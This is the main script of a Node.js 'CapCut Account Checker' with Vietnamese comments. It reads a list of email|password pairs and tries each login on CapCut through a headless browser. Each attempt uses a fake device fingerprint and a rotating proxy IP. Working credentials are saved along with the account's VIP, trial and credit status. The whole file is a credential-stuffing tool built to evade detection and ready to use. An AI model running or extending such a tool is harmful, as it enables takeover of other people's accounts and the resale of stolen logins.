#!/usr/bin/env node
/**
 * CapCut Account Checker — Headless browser + fake device + proxy mktproxy.
 *
 * Hỗ trợ NHIỀU proxy key: round-robin mỗi account qua key khác nhau.
 * Xuất: email|pass|uid|vip|trial|credit|benefit
 *
 * Usage:
 *   node index.js
 *   node index.js --mkt-proxy-keys=key1,key2,key3
 */

import { readFileSync, writeFileSync, appendFileSync, existsSync } from 'node:fs';
import { launchBrowser, closeBrowser, checkAccount } from './browser.js';
import { newDevice } from './device.js';
import { ProxyPool } from './proxy.js';
import {
  MKT_PROXY_KEYS, DELAY_MS, ROTATE_EACH,
  INPUT_FILE, OUTPUT_FILE,
} from './config.js';

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

async function main() {
  if (!existsSync(INPUT_FILE)) {
    console.error(`Không tìm thấy file ${INPUT_FILE}`);
    console.log('Tạo file accounts.txt với mỗi dòng: email|password');
    process.exit(1);
  }

  const lines = readFileSync(INPUT_FILE, 'utf-8')
    .split('\n')
    .map(l => l.trim())
    .filter(l => l && !l.startsWith('#'));

  if (lines.length === 0) {
    console.log('File accounts.txt trống.');
    process.exit(0);
  }

  // Đọc results cũ — bỏ qua acc đã OK, chỉ chạy lại lỗi/chưa chạy
  const doneSet = new Set();
  if (existsSync(OUTPUT_FILE)) {
    const old = readFileSync(OUTPUT_FILE, 'utf-8').split('\n');
    for (const row of old) {
      const cols = row.split('|');
      if (cols.length >= 4 && cols[0] !== 'email') {
        const hasError = cols[2]?.startsWith('ERROR') || cols[2]?.startsWith('SKIP')
          || cols[2]?.includes('timeout') || cols[2]?.includes('Timeout')
          || cols[3] === '' || cols[2] === '';
        if (!hasError) doneSet.add(cols[0]);
      }
    }
    if (doneSet.size > 0) console.log(`[resume] Bỏ qua ${doneSet.size} acc đã OK từ ${OUTPUT_FILE}\n`);
  }

  const pool = new ProxyPool(MKT_PROXY_KEYS, ROTATE_EACH);

  const todo = lines.filter(l => !doneSet.has(l.split('|')[0]?.trim()));

  console.log('═══ CAPCUT CHECKER ═══');
  console.log(`Accounts:    ${lines.length} (chạy ${todo.length}, bỏ qua ${lines.length - todo.length})`);
  console.log(`Proxy keys:  ${pool.size || 'không có (direct)'}`);
  if (pool.size > 0) console.log(`  Keys:      ${MKT_PROXY_KEYS.map((k, i) => `#${i + 1} ${k.slice(0, 6)}...`).join(', ')}`);
  console.log(`Rotate IP:   ${ROTATE_EACH ? 'mỗi account' : 'không'}`);
  console.log(`Delay:       ${DELAY_MS}ms`);
  console.log(`Output:      ${OUTPUT_FILE}`);
  console.log('Format:      email|pass|uid|vip|trial|credit|benefit');
  console.log('');

  if (doneSet.size === 0) {
    writeFileSync(OUTPUT_FILE, 'email|pass|uid|vip|trial|credit|benefit\n');
  }

  console.log('[browser] Khởi tạo headless Chromium...');
  await launchBrowser(true);
  console.log('[browser] OK\n');

  let ok = doneSet.size, fail = 0;

  if (todo.length === 0) {
    console.log('\nTất cả accounts đã chạy OK. Xoá results.txt để chạy lại từ đầu.');
    process.exit(0);
  }

  for (let i = 0; i < todo.length; i++) {
    const parts = todo[i].split('|');
    const email = parts[0]?.trim();
    const password = parts[1]?.trim();

    if (!email || !password) {
      appendFileSync(OUTPUT_FILE, `${lines[i]}|SKIP||||\n`);
      fail++;
      continue;
    }

    console.log(`[${i + 1}/${todo.length}] ${email}`);

    // Lấy proxy từ pool (round-robin)
    let pUrl = null;
    if (pool.size > 0) {
      const p = await pool.next();
      if (p.error) {
        console.log(`  [proxy #${p.keyIndex}] lỗi: ${p.error} — thử direct`);
      } else if (p.url) {
        pUrl = p.url;
        console.log(`  [proxy #${p.keyIndex}] ${p.ip}`);
      }
    }

    const device = newDevice();

    try {
      const result = await checkAccount(email, password, device, pUrl);

      let line;
      if (result.error) {
        line = `${email}|${password}|${result.error}||||`;
        fail++;
        console.log(`  ✗ ${result.error}`);
      } else {
        line = `${email}|${password}|${result.uid}|${result.vip}|${result.trial}|${result.credit}|${result.benefit}`;
        ok++;
        console.log(`  ✓ vip=${result.vip} trial=${result.trial} credit=${result.credit}`);
      }
      appendFileSync(OUTPUT_FILE, line + '\n');
    } catch (e) {
      appendFileSync(OUTPUT_FILE, `${email}|${password}|ERROR:${e.message}||||\n`);
      fail++;
      console.log(`  ✗ ${e.message}`);
    }

    if (i < todo.length - 1) await sleep(DELAY_MS);
  }

  await closeBrowser();

  console.log('');
  console.log('═══ KẾT QUẢ ═══');
  console.log(`  OK:   ${ok}`);
  console.log(`  Fail: ${fail}`);
  console.log(`  File: ${OUTPUT_FILE}`);
  console.log('═══ XONG ═══');
}

main().catch(e => { console.error(e); closeBrowser(); process.exit(1); });
